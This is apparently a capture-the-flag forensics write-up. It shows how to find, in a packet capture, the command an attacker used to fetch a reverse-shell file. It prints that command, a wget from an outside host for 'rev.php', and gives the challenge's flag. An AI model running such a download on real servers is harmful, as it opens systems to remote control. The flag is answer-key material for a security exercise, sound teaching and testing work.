# Shell

> What did the attacker do for the reverse shell in the server?

Download the pcap file [here](file/challenge.zip)

# How to Solve

We need look the pcap file and see the http request with filter string `terminal.php`

![POC 1](images/POC%201.jpg)

Seems there a command to spawn a file, so we need confirm the file

![POC 2](images/POC%202.jpg)

Then it a sure the command is `wget http://192.168.1.7:8000/rev.php`

Because the format is `BDSEC{command}`

Then flag is

```
BDSEC{wget_http://192.168.1.7:8000/rev.php}
```